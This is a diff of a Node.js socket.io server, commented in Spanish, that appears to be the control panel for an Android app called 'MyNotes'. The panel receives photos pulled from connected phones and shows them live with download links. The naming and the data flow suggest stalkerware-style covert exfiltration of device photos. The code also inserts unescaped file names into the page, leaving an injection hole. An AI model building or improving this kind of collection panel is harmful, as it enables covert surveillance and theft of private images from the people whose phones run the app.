@@ -6,25 +6,86 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-// Servir una página simple para ver las fotos
+// --- DISEÑO MEJORADO DEL PANEL ---
 app.get('/', (req, res) => {
     res.send(`
     <html>
         <head>
-            <title>Panel de Control - MyNotes</title>
+            <title>MyNotes - Centro de Control</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
             <style>
-                body { font-family: sans-serif; background: #222; color: #fff; padding: 20px; }
-                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
-                .card { background: #333; padding: 10px; border-radius: 8px; text-align: center; }
-                img { width: 100%; border-radius: 5px; }
-                p { font-size: 12px; overflow: hidden; text-overflow: ellipsis; }
-                h1 { color: #4CAF50; }
+                /* Estilo oscuro moderno */
+                body { 
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+                    background-color: #121212; 
+                    color: #e0e0e0; 
+                    margin: 0; 
+                    padding: 20px; 
+                }
+                h1 { color: #bb86fc; text-align: center; margin-bottom: 10px; }
+                
+                /* Barra de estado */
+                #status { 
+                    text-align: center; 
+                    padding: 12px; 
+                    background: #1f1f1f; 
+                    border-radius: 8px; 
+                    margin-bottom: 25px;
+                    border: 1px solid #333;
+                    color: #03dac6;
+                    font-weight: bold;
+                }
+
+                /* Rejilla de fotos (Gallery Grid) */
+                .gallery { 
+                    display: grid; 
+                    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); 
+                    gap: 15px; 
+                }
+
+                /* Tarjeta de cada foto */
+                .card { 
+                    background: #1e1e1e; 
+                    border-radius: 10px; 
+                    overflow: hidden; 
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
+                    transition: transform 0.2s;
+                    display: flex;
+                    flex-direction: column;
+                }
+                .card:hover { transform: translateY(-5px); border: 1px solid #bb86fc; }
+
+                /* Imagen */
+                img { 
+                    width: 100%; 
+                    height: 150px; 
+                    object-fit: cover; 
+                    cursor: pointer;
+                }
+
+                /* Información y Botón */
+                .info { padding: 10px; display: flex; flex-direction: column; gap: 8px; }
+                .name { font-size: 12px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+                
+                /* BOTÓN DE DESCARGA */
+                .btn-download {
+                    background-color: #3700b3;
+                    color: white;
+                    text-decoration: none;
+                    padding: 8px;
+                    border-radius: 5px;
+                    text-align: center;
+                    font-size: 12px;
+                    font-weight: bold;
+                    transition: background 0.3s;
+                }
+                .btn-download:hover { background-color: #6200ee; }
             </style>
         </head>
         <body>
-            <h1>📷 Fotos Recibidas (En Vivo)</h1>
-            <div id="status">Esperando conexión...</div>
-            <div class="grid" id="photoGrid"></div>
+            <h1>📁 Galería MyNotes</h1>
+            <div id="status">⏳ Esperando conexión del dispositivo...</div>
+            <div class="gallery" id="photoGrid"></div>
 
             <script src="/socket.io/socket.io.js"></script>
             <script>
@@ -32,18 +93,34 @@ app.get('/', (req, res) => {
                 const grid = document.getElementById('photoGrid');
                 const status = document.getElementById('status');
 
+                // Aviso de conexión
                 socket.on('connection_alert', (msg) => {
-                    status.innerText = "✅ " + msg;
-                    status.style.color = '#4CAF50';
+                    status.innerHTML = "🟢 " + msg;
+                    status.style.borderColor = '#03dac6';
                 });
 
-                // Escuchar cuando llega una foto nueva desde el servidor (rebotada del Android)
+                // Al recibir una foto nueva
                 socket.on('new_photo', (data) => {
+                    // Evitar duplicados (si la red falla y reenvía)
+                    if(document.getElementById(data.path)) return;
+
                     const card = document.createElement('div');
                     card.className = 'card';
-                    // Convertir base64 a imagen visible
-                    card.innerHTML = \`<img src="data:image/jpeg;base64,\${data.image64}"/><p>\${data.name}</p>\`;
-                    grid.prepend(card); // Poner la más nueva al principio
+                    card.id = data.path; // ID único para evitar repetidas
+                    
+                    // Convertir base64 a formato utilizable
+                    const imgSource = \`data:image/jpeg;base64,\${data.image64}\`;
+                    
+                    card.innerHTML = \`
+                        <img src="\${imgSource}" onclick="window.open('\${imgSource}')" title="Ver grande">
+                        <div class="info">
+                            <div class="name">\${data.name}</div>
+                            <a href="\${imgSource}" download="\${data.name}" class="btn-download">⬇ Descargar</a>
+                        </div>
+                    \`;
+                    
+                    // 'prepend' pone las fotos nuevas PRIMERO (arriba)
+                    grid.prepend(card); 
                 });
             </script>
         </body>
@@ -52,34 +129,33 @@ app.get('/', (req, res) => {
 });
 
 const server = http.createServer(app);
+
+// CONFIGURACIÓN DE ESTABILIDAD
 const io = new Server(server, {
-    cors: { origin: "*" }, // Permitir conexiones desde cualquier lugar (App Android)
-    allowEIO3: true
+    cors: { origin: "*" },
+    allowEIO3: true,         // Vital para compatibilidad con Android
+    maxHttpBufferSize: 1e8,  // AUMENTADO A 100MB: Evita que se "corte" la conexión con fotos grandes
+    pingTimeout: 60000       // Esperar más tiempo antes de desconectar por mala red
 });
 
 io.on('connection', (socket) => {
-    console.log('🔗 Dispositivo conectado:', socket.id);
-    
-    // Avisar al panel web que alguien se conectó
-    io.emit('connection_alert', `Dispositivo conectado: ${socket.id}`);
+    console.log('🔗 Cliente conectado:', socket.id);
+    io.emit('connection_alert', `Dispositivo conectado (ID: ${socket.id.substring(0,5)})`);
 
-    // Escuchar datos de la app Android
     socket.on('usrData', (data) => {
+        // Solo procesamos si es una imagen válida
         if (data.dataType === 'images_list' && data.image64) {
-            console.log(`📸 Recibida: ${data.name}`);
-            
-            // Reenviar la foto a tu navegador web para que la veas
             io.emit('new_photo', data);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log('❌ Dispositivo desconectado');
+        console.log('❌ Cliente desconectado');
+        io.emit('connection_alert', '🔴 Dispositivo desconectado (Esperando...)');
     });
 });
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`Servidor corriendo en puerto ${PORT}`);
-
+    console.log(`🚀 Servidor Premium corriendo en puerto ${PORT}`);
 });
